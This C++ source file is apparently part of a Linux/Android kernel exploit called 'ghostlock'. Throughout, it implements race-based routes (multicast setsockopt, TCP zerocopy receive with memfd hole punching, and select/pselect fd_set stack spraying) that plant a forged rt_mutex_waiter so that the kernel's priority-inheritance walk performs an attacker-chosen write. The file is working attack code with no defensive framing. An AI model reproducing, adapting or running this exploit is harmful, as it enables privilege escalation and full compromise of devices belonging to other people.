#include "common.h"

#include <array>
#include <ctime>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/timerfd.h>

#include "target.h"
#include "session/exploit_session.hpp"

/* The two Multicast stamp buffers intentionally remain dynamic stack frames.
 * Their layout/order is device-verified and must not become heap-backed STL. */
#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "routes/multicast_waiter_route.h"
#include "routes/select_stack_route.h"
#include "routes/tcp_zerocopy_route.h"

using namespace ghostlock;
using namespace ghostlock::profile;
using namespace ghostlock::session;

namespace ghostlock::route {
    static double fops_elapsed_ms(struct timespec *ref) {
        return runtime_elapsed_ms(ref);
    }

    static const struct execution_settings *execution_settings(void) {
        return g_exploit_session.profile.execution();
    }

    /* Resident multicast writer wrappers (CPP13): the owning class lives in
 * multicast_waiter_route.cpp; the C-style call sites stay unchanged. */
    int kernel5_resident_start(void) {
        return multicast_waiter::resident_route().start();
    }

    int kernel5_resident_write(uintptr_t target, uintptr_t value) {
        return multicast_waiter::resident_route().write(target, value);
    }

    void kernel5_resident_stop(void) {
        multicast_waiter::resident_route().stop();
    }

    RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
        (void) request;
        RouteStatus status = {.code = ROUTE_RETRYABLE};
        MulticastWaiterLayout layout =
                g_exploit_session.profile.multicast_layout();
        size_t stamp_size = layout.buffer_size;
        /* VLA size comes from the validated profile geometry; the encode step
     * rejects an undersized buffer before any indexed write. */
    __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
        memset(stamp, 0, sizeof(stamp));
        if (!encode_multicast_waiter(
            {reinterpret_cast<std::byte *>(stamp), stamp_size},
            layout.waiter_offset, layout.task_offset, layout.lock_offset,
            (g_exploit_session.heap.current.fake_task), (g_exploit_session.heap.current.fake_lock))) {
            status.step = 59;
            status.error_number = EOVERFLOW;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            pr_warning("multicast byte injection rejected: waiter=%zu task=%zu "
                       "lock=%zu buffer=%zu\n", layout.waiter_offset,
                       layout.task_offset, layout.lock_offset, stamp_size);
            return status;
        }
        uint16_t family = AF_UNSPEC;
        memcpy(stamp + 8, &family, sizeof(family));

        int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
        if (fd < 0) {
            status.step = 60;
            status.error_number = errno;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            status.code = ROUTE_FALLBACK_SAFE;
            return status;
        }
        g_exploit_session.race.consumer_calls.store(0);
        g_exploit_session.race.consumer_success.store(0);
        g_exploit_session.race.consumer_stop.store(0);
        g_exploit_session.race.route_delay_usec.store(0);
        errno = 0;
        int stamp_result =
                setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, (socklen_t) sizeof(stamp));
        status.step = 61;
        status.error_number = errno;
        g_exploit_session.race.consumer_go.store(1);
        for (int spin = 0; spin < 100000000 &&
                           g_exploit_session.race.consumer_calls.load() == 0; spin++)
            __asm__ volatile (
        "yield"
        ::: "memory");
        g_exploit_session.race.consumer_go.store(0);
        while (g_exploit_session.race.consumer_inflight.load())
            __asm__ volatile (
        "yield"
        ::: "memory");
        close(fd);
        status.userspace_clean = 1;
        status.kernel_disarmed = 1;
        if (stamp_result == 0 ||
            g_exploit_session.race.consumer_success.load() > 0) {
            status.step = 0;
            status.error_number = 0;
            status.code = ROUTE_OK;
        } else {
            status.code = ROUTE_FALLBACK_SAFE;
        }
        pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d\n",
                status.code, status.userspace_clean, status.kernel_disarmed,
                status.step, status.error_number);
        return status;
    }

    /* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
 * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
 * waiter->lock. */
#define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)

    static void tcp_wait_for_consumer_idle(tcp_zerocopy::TcpZerocopyRouteContext *context) {
        context->race->consumer_go.store(0);
        while (context->race->consumer_inflight.load()) {
            __asm__ volatile (
            "yield"
            ::: "memory");
        }
    }

    static int tcp_make_pair(tcp_zerocopy::TcpZerocopyRouteContext *context) {
        UniqueFd listener(socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0));
        if (!listener.valid()) {
            return -1;
        }
        int one = 1;
        setsockopt(listener.get(), SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        addr.sin_port = 0;

        if (bind(listener.get(), (struct sockaddr *) &addr, sizeof(addr)) != 0 ||
            listen(listener.get(), 1) != 0) {
            return -1;
        }

        socklen_t addr_len = sizeof(addr);
        if (getsockname(listener.get(), (struct sockaddr *) &addr, &addr_len) != 0) {
            return -1;
        }

        context->client_fd.reset(socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0));
        if (!context->client_fd.valid()) {
            return -1;
        }
        if (connect(context->client_fd.get(), (struct sockaddr *) &addr, sizeof(addr)) != 0) {
            context->client_fd.reset();
            return -1;
        }

        context->server_fd.reset(accept4(listener.get(), nullptr, nullptr, SOCK_CLOEXEC));
        if (!context->server_fd.valid()) {
            context->client_fd.reset();
            return -1;
        }
        return 0;
    }

    /* Repeatedly fill and punch the context-owned zerocopy backing memfd. Input:
 * tcp_zerocopy::TcpZerocopyRouteContext; output: context-owned phase/error flags. */
    static void *tcp_punch_thread(void *arg) {
        support::disable_rseq_for_thread();
        auto *context = static_cast<tcp_zerocopy::TcpZerocopyRouteContext *>(arg);
        while (!context->punch_go.load() &&
               !context->punch_stop.load()) {
            sched_yield();
        }
        while (!context->punch_stop.load()) {
            if (fallocate(context->punch_fd.get(), 0, 0, (off_t) context->mapping_length) != 0) {
                context->punch_failed.store(errno ? errno : EIO);
                pr_warning("tcp punch fill errno=%d\n", errno);
                break;
            }
            context->punch_phase.store(1);
            if (fallocate(context->punch_fd.get(),
                          FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                          (off_t) context->page_size,
                          (off_t)(context->mapping_length - context->page_size)) != 0) {
                /* without the hole the target page keeps stale contents and the
             * zerocopy write misses */
                context->punch_failed.store(errno ? errno : EIO);
                pr_warning("tcp punch hole errno=%d\n", errno);
            }
            context->punch_phase.store(0);
            if (context->punch_failed.load()) {
                break;
            }
        }
        return nullptr;
    }

    /* Acquire every userspace resource owned by the TCP route. No PI consumer or
 * punch operation is armed until this function has completed successfully. */
} // namespace ghostlock::route

namespace ghostlock::route::tcp_zerocopy {

int TcpZerocopyRoute::prepare() noexcept {
    if (!(g_exploit_session.heap.current.base) || !(g_exploit_session.heap.current.fake_lock) || !(g_exploit_session.
            heap.current.fake_fops)) {
        pr_warning("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
                   (g_exploit_session.heap.current.base), (g_exploit_session.heap.current.fake_lock),
                   (g_exploit_session.heap.current.fake_fops));
        return fail(40, 0);
    }

    if (route::tcp_make_pair(this) != 0) {
        pr_warning("tcp route pair setup failed errno=%d\n", errno);
        return fail(41, errno);
    }

    page_size = (size_t) sysconf(_SC_PAGESIZE);
    punch_fd.reset(
        (int) syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC));
    if (!punch_fd.valid() ||
        fallocate(punch_fd.get(), 0, 0, (off_t) mapping_length) != 0) {
        pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
        return fail(42, errno);
    }
    void *mapped = mmap(nullptr, mapping_length, PROT_READ | PROT_WRITE,
                        MAP_SHARED, punch_fd.get(), 0);
    if (mapped == MAP_FAILED) {
        pr_warning("tcp route mmap errno=%d\n", errno);
        return fail(43, errno);
    }
    mapping = MappedRegion(mapped, mapping_length);
    unsigned char *bytes = static_cast<unsigned char *>(mapping.data());
    for (size_t off = 0; off < mapping_length; off += page_size) {
        bytes[off] = 0x55;
    }

    race->consumer_stop.store(0);
    race->consumer_go.store(0);
    race->consumer_calls.store(0);
    race->consumer_success.store(0);
    int thread_error = punch_worker.start(route::tcp_punch_thread, this);
    if (thread_error != 0) {
        pr_warning("tcp route punch thread errno=%d\n", thread_error);
        return fail(44, thread_error);
    }
    return 0;
}

/* Run the route after prepare has established exclusive resource ownership. */
RouteStatus TcpZerocopyRoute::execute() noexcept {
    /* waiter->task carries init_task's phys alias, not the image address */
    uintptr_t waiter_task = ghostlock::profile::slide_init_task();
    int arm_seq = (int) execution->tcp_arm_sequence;
    int post_hold =
            (int) execution->tcp_post_receive_hold_iterations;
    int attempts = (int) execution->tcp_attempts;

    pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
            "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
            (g_exploit_session.heap.current.base), (g_exploit_session.heap.current.fake_lock),
            (g_exploit_session.heap.current.fake_w0), (g_exploit_session.heap.current.fake_task), waiter_task,
            attempts, arm_seq, post_hold);

    punch_go.store(1);
    /* custom-write mode: fire the PI walk immediately */
    race->route_delay_usec.store(0);

    std::array < unsigned char, 64 > sendbuf{};
    sendbuf.fill(0x33);

    for (int i = 1; i <= attempts && !route_won; i++) {
        int calls_before = race->consumer_calls.load();
        int success_before = race->consumer_success.load();
        (void) send(server_fd.get(), sendbuf.data(), sendbuf.size(),
                    MSG_DONTWAIT);
        while (punch_phase.load()) {
            sched_yield();
        }
        for (int spin = 0;
             !punch_phase.load() &&
             !punch_failed.load() &&
             spin < 10000000;
             spin++) {
            __asm__ volatile (
            "yield"
            ::: "memory");
        }
        if (punch_failed.load()) {
            (void) fail(46, punch_failed.load());
            pr_warning("tcp route puncher failed errno=%d\n",
                       status.error_number);
            break;
        }

        std::array < unsigned char, 0x40 > zc{};
        support::put64(zc.data(), 0x18,
                       (uint64_t)(uintptr_t)(static_cast<unsigned char *>(
                                                 mapping.data()) + page_size));
        support::put32(zc.data(), 0x20,
                       static_cast<uint32_t>(sendbuf.size()));
        support::put64(zc.data(), 0x28, waiter_task);
        support::put64(zc.data(), 0x30, (g_exploit_session.heap.current.fake_lock));

        socklen_t len = static_cast<socklen_t>(zc.size());
        errno = 0;
        int ret = getsockopt(client_fd.get(), IPPROTO_TCP,
                             TCP_ZEROCOPY_RECEIVE, zc.data(),
                             &len);
        int saved_errno = errno;
        /* release the consumer only once the zerocopy write landed in the
         * waiter frame; earlier release walks a half-written waiter */
        if (i >= arm_seq && ret == 0) {
            race->consumer_go.store(i);
            for (int spin = 0; spin < post_hold; spin++) {
                __asm__ volatile (
                "yield"
                ::: "memory");
            }
            route::tcp_wait_for_consumer_idle(this);
        }

        int calls = race->consumer_calls.load();
        int success = race->consumer_success.load();
        if (calls <= calls_before || success <= success_before) {
            if ((i % 100) == 0 || ret != 0) {
                pr_info("tcp route seq=%d ret=%d errno=%d len=%u calls=%d "
                        "success=%d\n",
                        i, ret, saved_errno, len, calls, success);
            }
            continue;
        }
        /* consumer fired: the PI walk derefed the crafted waiter and wrote.
         * stages verify their own effects; no cfi stage here. */
        route_won = 1;
        status.code = ROUTE_OK;
        status.step = 0;
        status.error_number = 0;
    }
    if (!route_won && status.step == 0) {
        (void) fail(45, 0);
    }
    return status;
}

} // namespace ghostlock::route::tcp_zerocopy

namespace ghostlock::route {
    /* Public compatibility entry: lifecycle is now explicitly ordered while the
 * common route dispatcher remains scheduled for S14. */
    RouteStatus do_tcp_fake_lock_route(const WriteRequest *request) {
        tcp_zerocopy::TcpZerocopyRouteContext context(
            &g_exploit_session.race, request, execution_settings(),
            TCP_PUNCH_SHMEM_LEN); // NOLINT(bugprone-implicit-widening-of-multiplication-result)
        if (context.prepare() == 0) {
            (void) context.execute();
        }
        context.disarm();
        context.destroy();
        if (context.status.code == ROUTE_DIRTY_FAILURE &&
            context.status.step == 47) {
            pr_warning("tcp route punch join errno=%d; resources retained\n",
                       context.status.error_number);
        } else if (context.status.code == ROUTE_DIRTY_FAILURE &&
                   context.status.step == 48) {
            pr_warning("tcp route munmap errno=%d\n", context.status.error_number);
        }

        pr_info("tcp route done=%d calls=%d success=%d status=%d clean=%d/%d "
                "step=%d errno=%d\n",
                context.route_won,
                context.race->consumer_calls.load(),
                context.race->consumer_success.load(), context.status.code,
                context.status.userspace_clean, context.status.kernel_disarmed,
                context.status.step, context.status.error_number);
        return context.status;
    }

    static int route_delay_usec(const select_stack::SelectStackRouteContext *context,
                                int attempt) {
        if (!context->layout.compact_waiter) {
            (void) attempt;
            /* Let select establish its frame and stamp the crafted waiter before
         * the PI walk fires. */
            return (int) context->execution->select_enter_delay_us;
        }
        /* Compact retry walks a delay ladder (U01/SELECT-01, mirroring the
     * upstream 50d2b72 candidate list); the profile's enter delay seeds the
     * first attempt. The ladder stays native-side until a Select device can
     * validate a schema extension. */
        const int seed = (int) context->execution->select_enter_delay_us;
        static const int delays[] = {
            50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
        };
        const int ladder = delays[(attempt - 1) % 8];
        return attempt == 1 && seed > 0 ? seed : ladder;
    }

    void fdset_put_word(fd_set *set, int word, uint64_t value) {
        unsigned long *bits = reinterpret_cast<unsigned long *>(set);
        bits[word] = (unsigned long) value;
    }

    uint64_t fdset_get_word(const fd_set *set, int word) {
        const unsigned long *bits = reinterpret_cast<const unsigned long *>(set);
        return bits[word];
    }

    static int pselect_words_per_set(void) {
        int bits_per_word = (int) (8 * sizeof(unsigned long));
        return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
    }

    static int pselect_put_global_word(
        fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
        int global_word, uint64_t value) {
        if (global_word < 0) {
            return 0;
        }

        int set_idx = global_word / words_per_set;
        int word_idx = global_word % words_per_set;
        switch (set_idx) {
            case 0:
                fdset_put_word(in, word_idx, value);
                return 1;
            case 1:
                fdset_put_word(out, word_idx, value);
                return 1;
            case 2:
                fdset_put_word(ex, word_idx, value);
                return 1;
            default:
                return 0;
        }
    }

    static int pselect_waiter_shift(const select_stack::SelectStackRouteContext *context) {
        return g_exploit_session.profile.loaded()
                   ? context->layout.waiter_shift
                   : PSELECT_WAITER_WORD_SHIFT;
    }

    static void pselect_put_waiter_word(
        select_stack::SelectStackRouteContext *context, int words_per_set,
        int waiter_word, uint64_t value, const char *name) {
        int global_word = pselect_waiter_shift(context) + waiter_word;
        int placed = pselect_put_global_word(
            context->input_set.raw(), context->output_set.raw(),
            context->exception_set.raw(),
            words_per_set, global_word, value);
        if (!placed) {
            pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
                       "words_per_set=%d nfds=%d\n",
                       name, waiter_word, global_word, words_per_set,
                       PSELECT_ROUTE_NFDS);
        }
    }

    static void open_selected_fds(
        fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
        /* every bit lands on the read end so select/pselect parks the full window */
        (void) write_fd;
        int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
        if (high_read < 0) {
            pr_warning("pselect F_DUPFD read errno=%d\n", errno);
            return;
        }
        for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
            if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
                dup2(high_read, fd);
            }
        }
        close(high_read);
        dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
        FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
    }

    static int standard_io_backup[3] = {-1, -1, -1};

    void reserve_standard_io(void) {
        for (int fd = 0; fd < 3; fd++) {
            if (standard_io_backup[fd] >= 0) continue;
            int backup = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 64);
            if (backup < 0) {
                pr_warning("standard io backup failed fd=%d errno=%d\n", fd, errno);
            } else {
                standard_io_backup[fd] = backup;
            }
        }
    }

    static void restore_standard_io(const BorrowedFd backup[3]) {
        for (int fd = 0; fd < 3; fd++) {
            if (!backup[fd].valid()) continue;
            dup2(backup[fd].get(), fd);
        }
    }

    static void select_stack_build_fdsets(select_stack::SelectStackRouteContext *context) {
        select_stack::FdSet *in = &context->input_set;
        select_stack::FdSet *out = &context->output_set;
        select_stack::FdSet *ex = &context->exception_set;
        const WriteRequest *request = context->request;
        in->zero();
        out->zero();
        ex->zero();

        int words_per_set = pselect_words_per_set();
        int compact = context->layout.compact_waiter;

        struct pselect_waiter_word {
            int word;
            uint64_t value;
            const char *name;
        };

        if (compact) {
            /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
         * the write value, children the write target; waiter->task is the
         * payload fake_task (planted fields for the PI walk). */
            struct pselect_waiter_word words[] = {
                {2, (g_exploit_session.heap.current.fake_right), "tree_pc"},
                {3, 0, "tree_right"},
                {4, request->target, "tree_left"},
                {5, (g_exploit_session.heap.current.fake_right), "pi_pc"},
                {6, 0, "pi_right"},
                {7, request->target, "pi_left"},
                {8, (g_exploit_session.heap.current.fake_task), "task"},
                {9, (g_exploit_session.heap.current.fake_lock), "lock"},
                {10, ((uint64_t) FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
                {11, 0, "deadline"},
                {12, 0, "ww_ctx"},
            };
            for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
                struct pselect_waiter_word *w = &words[i];
                pselect_put_waiter_word(context, words_per_set,
                                        w->word, w->value, w->name);
            }
        } else {
            /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
            struct pselect_waiter_word words[] = {
                {2, 0, "tree_pc"},
                {3, 0, "tree_right"},
                {4, 0, "tree_left"},
                {5, 1, "tree_prio"},
                {6, 0, "tree_deadline"},
                {7, 0, "pi_parent"},
                {8, 0, "pi_right"},
                {9, 0, "pi_left"},
                {10, 1, "pi_prio"},
                {11, 0, "pi_deadline"},
                {12, (g_exploit_session.heap.current.fake_task), "task"},
                {13, (g_exploit_session.heap.current.fake_lock), "lock"},
                {14, 3, "wake_state"},
            };
            for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
                struct pselect_waiter_word *w = &words[i];
                pselect_put_waiter_word(context, words_per_set,
                                        w->word, w->value, w->name);
            }
        }
    }
} // namespace ghostlock::route

namespace ghostlock::route::select_stack {

int SelectStackRoute::prepare() noexcept {
    if (!(g_exploit_session.heap.current.base) || !(g_exploit_session.heap.current.fake_lock) || !(g_exploit_session.
            heap.current.fake_fops)) {
        pr_warning("pselect route missing kernel page base=%016zx lock=%016zx "
                   "fops=%016zx\n", (g_exploit_session.heap.current.base), (g_exploit_session.heap.current.fake_lock),
                   (g_exploit_session.heap.current.fake_fops));
        return fail(30, 0);
    }
    int fds[2];
    if (pipe(fds) != 0) {
        return fail(31, errno);
    }
    pipe_read.reset(fds[0]);
    pipe_write.reset(fds[1]);

    /* Both routes park on a never-ready timerfd: the waiter must stay stale
     * on the pselect stack for the whole consumer window. */
    block.reset((int) syscall(SYS_timerfd_create, CLOCK_MONOTONIC, TFD_CLOEXEC));
    if (!block.valid()) {
        pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                   errno);
        block_borrows_pipe = 1;
    }
    high_read.reset(fcntl(block_fd(), F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 16));
    if (!high_read.valid()) {
        pr_warning("pselect F_DUPFD read errno=%d\n", errno);
        return fail(32, errno);
    }

    route::select_stack_build_fdsets(this);
    pr_info("pselect route setup shift=%d page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
            route::pselect_waiter_shift(this),
            (g_exploit_session.heap.current.base), (g_exploit_session.heap.current.fake_lock),
            (g_exploit_session.heap.current.fake_w0), (g_exploit_session.heap.current.fake_task),
            (unsigned long long) route::fdset_get_word(input_set.raw(), 0),
            (unsigned long long) route::fdset_get_word(input_set.raw(), 3),
            (unsigned long long) route::fdset_get_word(output_set.raw(), 0),
            (unsigned long long) route::fdset_get_word(exception_set.raw(), 0),
            (unsigned long long) route::fdset_get_word(exception_set.raw(), 1),
            (unsigned long long) route::fdset_get_word(exception_set.raw(), 2),
            (unsigned long long) route::fdset_get_word(exception_set.raw(), 3));

    /* The route may replace low fds, including stdout and stderr. */
    route::open_selected_fds(input_set.raw(), output_set.raw(), exception_set.raw(),
                             high_read.get(), pipe_write.get());
    owned_input_set = input_set;
    owned_output_set = output_set;
    owned_exception_set = exception_set;
    high_read.reset();
    selected_fds_installed = 1;
    return 0;
}

RouteStatus SelectStackRoute::execute() noexcept {
    struct timespec route_t0;
    clock_gettime(CLOCK_MONOTONIC, &route_t0);

    /* Compact retries rebuild the payload page between attempts (U01/SELECT-01,
     * mirroring upstream 50d2b72): a lost race clobbers the page, so every
     * attempt resprays and re-derives fake_* before rebuilding the fd_sets.
     * The consumer handshake advances consumer_go per attempt so the trigger
     * is seen as a new sequence. */
    const int attempts = layout.compact_waiter ? 4 : 1;
    int calls_total = 0;
    int successes_total = 0;

    for (int attempt = 1; attempt <= attempts; attempt++) {
        if (attempt > 1) {
            const uintptr_t rebuilt = support::prepare_good_kernel_page(request);
            if (!rebuilt || !(g_exploit_session.heap.current.fake_lock) ||
                !(g_exploit_session.heap.current.fake_fops)) {
                pr_warning("pselect retry page prepare failed attempt=%d\n", attempt);
                (void) fail(35, errno);
                break;
            }
            route::select_stack_build_fdsets(this);
            route::open_selected_fds(input_set.raw(), output_set.raw(),
                                     exception_set.raw(), block_fd(), pipe_write.get());
            owned_input_set = input_set;
            owned_output_set = output_set;
            owned_exception_set = exception_set;
        }

        race->consumer_calls.store(0);
        race->consumer_success.store(0);
        race->consumer_stop.store(0);
        int delay_usec = route::route_delay_usec(this, attempt);
        race->route_delay_usec.store(delay_usec);
        race->consumer_go.store(attempt);

        pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
                attempt, attempts, layout.compact_waiter,
                route::fops_elapsed_ms(&route_t0));
        errno = 0;
        if (layout.compact_waiter) {
            uint32_t timeout_us = execution->select_timeout_us;
            struct timespec ts = {
                .tv_sec = timeout_us / 1000000,
                .tv_nsec = (long) (timeout_us % 1000000) * 1000,
            };
            select_result = pselect(
                PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
                exception_set.raw(), &ts, nullptr);
        } else {
            uint32_t timeout_us = execution->select_timeout_us;
            struct timeval timeout = {
                .tv_sec = timeout_us / 1000000,
                .tv_usec = timeout_us % 1000000,
            };
            select_result = select(
                PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
                exception_set.raw(), &timeout);
        }
        select_errno = errno;
        route::restore_standard_io(stdio_backup);
        pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
                attempt, attempts, layout.compact_waiter,
                route::fops_elapsed_ms(&route_t0), select_result);
        race->consumer_go.store(0);

        const int calls = race->consumer_calls.load();
        const int successes = race->consumer_success.load();
        calls_total += calls;
        successes_total += successes;
        if (calls > 0 && successes > 0) {
            status.code = ROUTE_OK;
            status.step = 0;
            status.error_number = 0;
            break;
        }
        (void) fail(33, select_errno);
    }
    calls = calls_total;
    successes = successes_total;
    return status;
}

} // namespace ghostlock::route::select_stack

namespace ghostlock::route {
    RouteStatus do_pselect_fake_lock_route(const WriteRequest *request) {
        /* U01/SELECT-01: SelectStackRoute::execute() now retries compact routes
     * four times, rebuilding the payload page and fd_sets per attempt and
     * advancing the consumer handshake. The delay ladder and the attempt
     * count stay native-side until a Select device can validate a
     * profile-schema extension; the profile still owns the timeout. */
        select_stack::SelectStackRouteContext context(
            &g_exploit_session.race, request, execution_settings(),
            g_exploit_session.profile.select_stack_layout(),
            standard_io_backup);
        if (context.prepare() == 0) {
            (void) context.execute();
        }
        context.disarm();
        context.destroy();
        if (context.status.code == ROUTE_DIRTY_FAILURE &&
            context.status.step == 34) {
            pr_error("pselect consumer still inflight; leaking route fds\n");
        }

        pr_info("pselect route done calls=%d success=%d status=%d clean=%d/%d "
                "step=%d errno=%d\n", context.calls, context.successes,
                context.status.code, context.status.userspace_clean,
                context.status.kernel_disarmed, context.status.step,
                context.status.error_number);
        return context.status;
    }
} // namespace ghostlock::route
